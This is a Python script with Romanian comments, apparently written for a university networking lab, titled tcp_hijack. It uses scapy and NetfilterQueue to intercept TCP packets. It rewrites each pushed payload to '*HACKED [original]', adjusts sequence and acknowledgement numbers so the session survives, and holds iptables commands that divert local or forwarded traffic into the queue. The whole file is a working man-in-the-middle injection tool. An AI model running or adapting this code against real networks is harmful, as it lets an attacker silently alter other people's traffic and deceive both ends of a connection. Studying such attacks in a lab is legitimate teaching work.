#!/usr/bin/env python
# inspiratie de aici: https://networks.hypha.ro/capitolul6/#scapy_nfqueue
from scapy.all import *
from scapy.layers.inet import IP, TCP
from netfilterqueue import NetfilterQueue as NFQ
import os
import logging

USE_LOCAL_MACHINE = True 

# TCP-Flags
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80




#seq reala trimisa de socketi
seq_real=[0,0]
#ack reala trimisa de socketi
ack_real=[0,0]

#diferenta totala de octeti injectata in packete, incepand cu SYN
total_bytes_diff =[0,0]

#urmatorul ack furnizat(seq_real+send effective)
next_ack =[0,0]


def proceseaza(pachet):
    octeti = pachet.get_payload()
    scapy_packet = IP(octeti)
    # print("Pachet inainte: ")
    # scapy_packet.show()
    scapy_packet = alter_packet(scapy_packet)
    # print("Pachet dupa: ")
    # scapy_packet.show()
    pachet.set_payload(bytes(scapy_packet))
    pachet.accept()


def packet_payload_size(pachet):
    # calculam dimensiunea datelor pachetului (mai putin headerul)
    #https://stackoverflow.com/questions/6639799/calculate-size-and-start-of-tcp-packet-data-excluding-header
    syn = pachet[TCP].flags.value & SYN
    fin = pachet[TCP].flags.value & FIN
    len_data = pachet[IP].len - 20 - 4*len(pachet[IP].options) - 4*pachet[TCP].dataofs
    if syn or fin:
        len_data += 1
    return len_data

def alter_packet(pachet):
    """
    
    trebuie re-calculate campurile len si checksum
    """
    global seq_real,ack_real,total_bytes_diff

    #vedem daca pachetul contine headerele IP si TCP cu haslayer
    if pachet.haslayer(IP) and pachet.haslayer(TCP):
        try:
            #extragem flaguri
            push = pachet[TCP].flags.value & PSH
            ack = pachet[TCP].flags.value & ACK
            syn = pachet[TCP].flags.value & SYN
            fin = pachet[TCP].flags.value & FIN
            is_server = pachet[TCP].dport !=10001
            ix = 0 if is_server else 1


            '''
            det daca pachetul este destinat serverului sau clientului 
            prin verificarea valorii campului dport al pachetului TCP'''
            original_text=''
            if push:
                original_text = str(pachet[TCP].payload.load, "UTF8")

            logging.info("packet flag:%d seq: %d ack: %d port:%d syn: %d ack:%d push:%d payload:%s", pachet[TCP].flags.value ,
                  pachet[IP].seq , pachet[IP].ack,pachet[TCP].dport, syn, ack,push,original_text)        

            
            len_data = packet_payload_size(pachet)
                
            new_data = original_text
            # new_data = "YOU ARE HACKED [{0}]".format(original_text)
           
            if push:
                new_data = "*HACKED [{0}]".format(original_text)
          

            seq_real[ix]=pachet[IP].seq
            ack_real[ix]=pachet[IP].ack

            if syn:
                #flagul syn e setat, resetam diferente de biti / incepem o noua sesiune
                total_bytes_diff[ix] = 0

            #calculam seq si ack pentru pachetul cu ip ul corectat
            pachet[IP].seq = pachet[IP].seq + total_bytes_diff[ix]
            pachet[IP].ack = next_ack[1-ix]
        

            

            if push:
                pachet[TCP].payload.load = bytes(new_data, "UTF8")

            #stergem campurile chksum si len din ip si tcp
            del pachet[IP].chksum
            del pachet[IP].len
            del pachet[TCP].chksum
            # pentru a obtine din nou len si checksum, facem rebuild
            pachet = IP(pachet.build())
            

            #calculam dimensiunea noilor date payload ale pachetului modificat
            #actualizam in total_bytes_diff diferenta totala de octeti
            len_data_new = packet_payload_size(pachet)
            total_bytes_diff[ix] += (len_data_new-len_data)
            next_ack[ix]=seq_real[ix]+len_data

            logging.info("packet flat:%d seq: %d ack: %d port:%d syn: %d ack:%d push:%d", pachet[TCP].flags.value ,
                  pachet[IP].seq , pachet[IP].ack,pachet[TCP].dport, syn, ack,push)        

        except Exception as ex:
            logging.info("eroare la procesarea pachetului : %s", ex)
    return pachet


def iptables_config():
    #cum redirectionam pachetele catre coada netfiltequeue
    if USE_LOCAL_MACHINE:
        # limitam doar la tcp si un singur port
        # toate pachetele de la input se redirectioneaza catre coada 5
        os.system("iptables -I INPUT -p tcp --dport 10001 -j NFQUEUE --queue-num 5")
        # toate pachetele spre output
        os.system("iptables -I OUTPUT -p tcp --sport 10001 -j NFQUEUE --queue-num 5")
    else:
        # toate pachetele care sunt forwardate
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")


def main():
    logging.basicConfig(
        format="[LINE:%(lineno)d]# %(levelname)-8s [%(asctime)s]  %(message)s",
        level=logging.NOTSET,
    )
    
    logging.info("[tcp_hijack] programul a pornit")
    queue = NFQ()
    try:
        # iptables_config()
        queue.bind(5, proceseaza)
        logging.info("[tcp_hijack] coada de mesaje e formata. Hai sa pornim la drum.")
        queue.run()
    except Exception as error:
        logging.info("[tcp_hijack] a aparut o eroare: '%s'",error)
    except KeyboardInterrupt:
        queue.unbind()


main()
